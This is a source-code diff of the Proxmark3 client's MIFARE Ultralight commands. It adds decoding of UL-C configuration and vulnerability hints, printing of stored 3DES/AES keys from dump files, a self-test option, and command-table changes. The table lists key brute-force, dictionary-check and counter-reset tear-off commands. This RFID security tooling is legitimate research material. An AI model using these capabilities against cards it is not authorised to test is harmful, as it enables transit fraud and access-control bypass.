         PrintAndLogEx(INFO, "    on tag now.. " _RED_("%s"), sprint_hex_inrow(verify, MFU_BLOCK_SIZE));
-        PrintAndLogEx(HINT, "Hint: block 3 is OTP, check whether its block locking bit is set");
+        PrintAndLogEx(HINT, "Hint: Block 3 is OTP, check whether its block locking bit is set");
         return PM3_ESOFT;
     }
 
@@ -8204,7 +8512,7 @@ int CmdHF14MfuNDEFFormat(const char *Cmd) {
         // one sprint_hex_inrow() call per line: it returns a shared static buffer
         PrintAndLogEx(INFO, "    wanted...... " _GREEN_("%s"), sprint_hex_inrow(pages[1], 2 * MFU_BLOCK_SIZE));
         PrintAndLogEx(INFO, "    on tag now.. " _RED_("%s"), sprint_hex_inrow(verify + MFU_BLOCK_SIZE, 2 * MFU_BLOCK_SIZE));
-        PrintAndLogEx(HINT, "Hint: these blocks are ordinary user memory, check the lock bytes");
+        PrintAndLogEx(HINT, "Hint: Check the lock bytes");
         return PM3_ESOFT;
     }
 
@@ -8251,12 +8559,14 @@ static int CmdHF14AMfuEView(const char *Cmd) {
         arg_param_begin,
         arg_int0("e", "end", "<dec>", "index of last block"),
         arg_lit0("z", "dense", "dense dump output style"),
+        arg_lit0("v", "verbose", "verbose output, decode the UL-C config"),
         arg_param_end
     };
 
     CLIExecWithReturn(ctx, Cmd, argtable, true);
     int end = arg_get_int_def(ctx, 1, -1);
     bool dense_output = (g_session.dense_output || arg_get_lit(ctx, 2));
+    bool verbose = arg_get_lit(ctx, 3);
     CLIParserFree(ctx);
 
     bool override_end = (end != -1) ;
@@ -8280,10 +8590,16 @@ static int CmdHF14AMfuEView(const char *Cmd) {
 
     mfu_print_dump(dump, end, 0, dense_output);
 
+    ulc_cfg_vuln_t ulc_vuln = ULC_CFG_UNKNOWN;
+    if (verbose) {
+        ulc_vuln = mfu_print_dump_ulc_config(dump, end);
+    }
+
     if (ndef_detect_message(dump->data, end * MFU_BLOCK_SIZE)) {
         PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("hf mfu ndefread")"`");
     }
 
+    ulc_print_vuln_hint(ulc_vuln);
     free(dump);
     return PM3_SUCCESS;
 }
@@ -8353,18 +8669,95 @@ static int CmdHF14AMfuESave(const char *Cmd) {
     return res;
 }
 
+// Derive the tag type from the dump header,  version bytes and page count.
+// Uses the same version byte signatures as ul_select_card() does on a live tag.
+static uint64_t mfu_dump_get_tagtype(const mfu_dump_t *card) {
+
+    if (memcmp(card->version, "\x00\x04\x03\x01\x04\x00\x0F\x03", 8) == 0 ||
+            memcmp(card->version, "\x00\x04\x03\x02\x04\x00\x0F\x03", 8) == 0 ||
+            memcmp(card->version, "\x00\x04\x03\x03\x04\x00\x0F\x03", 8) == 0) {
+        return MFU_TT_UL_AES;
+    }
+
+    // UL-C has no GET_VERSION,  the dump holds zeroes there
+    bool version_zero = true;
+    for (uint8_t i = 0; i < ARRAYLEN(card->version); i++) {
+        if (card->version[i] != 0x00) {
+            version_zero = false;
+            break;
+        }
+    }
+
+    if (version_zero && card->pages == MAX_ULC_BLOCKS) {
+        return MFU_TT_UL_C;
+    }
+
+    return MFU_TT_UNKNOWN;
+}
+
+// UL-C config and key page lock from a dump, needs pages 0x28..0x2B
+static ulc_cfg_vuln_t mfu_print_dump_ulc_config(const mfu_dump_t *card, uint16_t block_cnt) {
+    if ((mfu_dump_get_tagtype(card) != MFU_TT_UL_C) || (block_cnt < (0x2B + 1))) {
+        return ULC_CFG_UNKNOWN;
+    }
+    ulc_cfg_vuln_t v = ulc_print_configuration(card->data + (0x28 * MFU_BLOCK_SIZE));
+    ulc_print_config_verdict(v);
+    return v;
+}
+
+// `hf mfu dump` appends the authentication key to the dump when one was given.
+// UL-C:   pages 0x2C..0x2F,  stored as SwapEndian64(key, 16, 8)
+// UL-AES: pages 0x30..0x33,  stored as SwapEndian64(key, 16, 16)
+static void mfu_print_dump_keys(mfu_dump_t *card, uint16_t block_cnt) {
+
+    uint64_t tagtype = mfu_dump_get_tagtype(card);
+
+    uint8_t page;
+    if ((tagtype == MFU_TT_UL_C) && (block_cnt > (MFU_ULC_KEY0_PAGE + 3))) {
+        page = MFU_ULC_KEY0_PAGE;
+    } else if ((tagtype == MFU_TT_UL_AES) && (block_cnt > (MFU_AES_KEY0_PAGE + 3))) {
+        page = MFU_AES_KEY0_PAGE;
+    } else {
+        return;
+    }
+
+    uint8_t *key = card->data + (page * MFU_BLOCK_SIZE);
+
+    PrintAndLogEx(NORMAL, "");
+    if (tagtype == MFU_TT_UL_C) {
+        PrintAndLogEx(INFO, "--- " _CYAN_("UL-C 3DES key") " -------------------------");
+    } else {
+        PrintAndLogEx(INFO, "--- " _CYAN_("UL-AES key") " ----------------------------");
+    }
+
+    uint8_t zeros[MIFAREU3P_KEY_SIZE] = {0x00};
+    if (memcmp(key, zeros, sizeof(zeros)) == 0) {
+        PrintAndLogEx(INFO, "    " _RED_("n/a") " - page %u..%u is all zero", page, page + 3);
+        PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("hf mfu dump -k <key>") "` to store the key in the dump");
+        return;
+    }
+
+    if (tagtype == MFU_TT_UL_C) {
+        ulc_print_3deskey(key);
+    } else {
+        ulaes_print_key(key);
+    }
+}
+
 static int CmdHF14AMfuView(const char *Cmd) {
 
     CLIParserContext *ctx;
     CLIParserInit(&ctx, "hf mfu view",
                   "Print a MIFARE Ultralight/NTAG dump file (bin/eml/json)",
-                  "hf mfu view -f hf-mfu-01020304-dump.bin"
+                  "hf mfu view -f hf-mfu-01020304-dump.bin\n"
+                  "hf mfu view --selftest"
                  );
     void *argtable[] = {
         arg_param_begin,
-        arg_str1("f", "file", "<fn>", "Specify a filename for dump file"),
+        arg_str0("f", "file", "<fn>", "Specify a filename for dump file"),
         arg_lit0("v", "verbose", "Verbose output"),
         arg_lit0("z", "dense", "dense dump output style"),
+        arg_lit0(NULL, "selftest", "Run the dump parsers self tests and exit"),
         arg_param_end
     };
     CLIExecWithReturn(ctx, Cmd, argtable, false);
@@ -8373,7 +8766,17 @@ static int CmdHF14AMfuView(const char *Cmd) {
     CLIParamStrToBuf(arg_get_str(ctx, 1), (uint8_t *)filename, FILE_PATH_SIZE, &fnlen);
     bool verbose = arg_get_lit(ctx, 2);
     bool dense_output = (g_session.dense_output || arg_get_lit(ctx, 3));
+    bool selftest = arg_get_lit(ctx, 4);
     CLIParserFree(ctx);
+
+    if (selftest) {
+        return transit_mfu_selftest();
+    }
+
+    if (fnlen == 0) {
+        PrintAndLogEx(ERR, "Specify a filename with `-f` or run `--selftest`");
+        return PM3_EINVARG;
+    }
 
     // read dump file
     uint8_t *dump = NULL;
@@ -8406,11 +8809,20 @@ static int CmdHF14AMfuView(const char *Cmd) {
     mfu_dump_t *p = (mfu_dump_t *)dump;
     mfu_print_dump(p, block_cnt, 0, dense_output);
 
+    ulc_cfg_vuln_t ulc_vuln = ULC_CFG_UNKNOWN;
+    if (verbose) {
+        ulc_vuln = mfu_print_dump_ulc_config(p, block_cnt);
+        mfu_print_dump_keys(p, block_cnt);
+    }
+
     // we need to skip prefix
     if (ndef_detect_message(p->data, block_cnt * MFU_BLOCK_SIZE)) {
         PrintAndLogEx(HINT, "Hint: Try `" _YELLOW_("hf mfu ndefread")"`");
     }
 
+    (void)transit_mfu_parse(p->data, block_cnt * MFU_BLOCK_SIZE);
+
+    ulc_print_vuln_hint(ulc_vuln);
     free(dump);
     return PM3_SUCCESS;
 }
@@ -9059,7 +9471,7 @@ static int CmdHF14AMfUeSetBlk(const char *Cmd) {
 
     // MFU emulator page data starts after the 56-byte mfu_dump_t prefix, so shift the
     // page index by MFU_DUMP_PREFIX_LENGTH/MFU_BLOCK_SIZE (=14), width = MFU_BLOCK_SIZE (4).
-    res = mf_eml_set_mem_xt(data, blk + (MFU_DUMP_PREFIX_LENGTH / MFU_BLOCK_SIZE), count, MFU_BLOCK_SIZE);
+    res = mf_eml_set_mem_xt(data, blk + (MFU_DUMP_PREFIX_LENGTH / MFU_BLOCK_SIZE), count, MFU_BLOCK_SIZE, 0);
     if (res != PM3_SUCCESS) {
         PrintAndLogEx(FAILED, "Failed to set emulator memory");
         return res;
@@ -9076,13 +9488,12 @@ static command_t CommandTable[] = {
     {"keygen",   CmdHF14AMfUKeyGen,         AlwaysAvailable, "Generate DES/3DES/AES MIFARE diversified keys"},
     {"pwdgen",   CmdHF14AMfUPwdGen,         AlwaysAvailable, "Generate pwd from known algos"},
     {"otptear",  CmdHF14AMfuOtpTearoff,     IfPm3Iso14443a,  "Tear-off test on OTP bits"},
-    {"countertear", CmdHF14AMfuEv1CounterTearoff,     IfPm3Iso14443a,  "Tear-off test on Ev1/NTAG Counter bits"},
+    {"countertear", CmdHF14AMfuEv1CounterTearoff,     IfPm3Iso14443a,  "Reset a Mifare UL EV1 counter with tear-off"},
     {"-----------", CmdHelp,                IfPm3Iso14443a,  "----------------------- " _CYAN_("operations") " -----------------------"},
+    {"chk",      CmdHF14AMfUAuthChk,        IfPm3Iso14443a,  "Ultralight C/AES - Authentication dictionary check"},
     {"cauth",    CmdHF14AMfUCAuth,          IfPm3Iso14443a,  "Ultralight-C - Authentication"},
-    {"cchk",     CmdHF14AMfUCAuthChk,       IfPm3Iso14443a,  "Ultralight-C - Authentication dictionary check"},
     {"desbrute", CmdHF14AMfUCDesBrute,      AlwaysAvailable, "Ultralight-C - 3DES key segment brute force"},
     {"aesauth",  CmdHF14AMfUAESAuth,        IfPm3Iso14443a,  "Ultralight-AES - Authentication"},
-    {"aeschk",   CmdHF14AMfUAESAuthChk,     IfPm3Iso14443a,  "Ultralight-AES - Authentication dictionary check"},
     {"aesgetuid",  CmdHF14AMfUAESGetUID,    IfPm3Iso14443a,  "Ultralight-AES - Get UID when RID in use"},
     {"setkey",   CmdHF14AMfUSetKey,         IfPm3Iso14443a,  "Ultralight C/AES - Set 3DES/AES keys"},
     {"dump",     CmdHF14AMfUDump,           IfPm3Iso14443a,  "Dump MIFARE Ultralight family tag to binary file"},
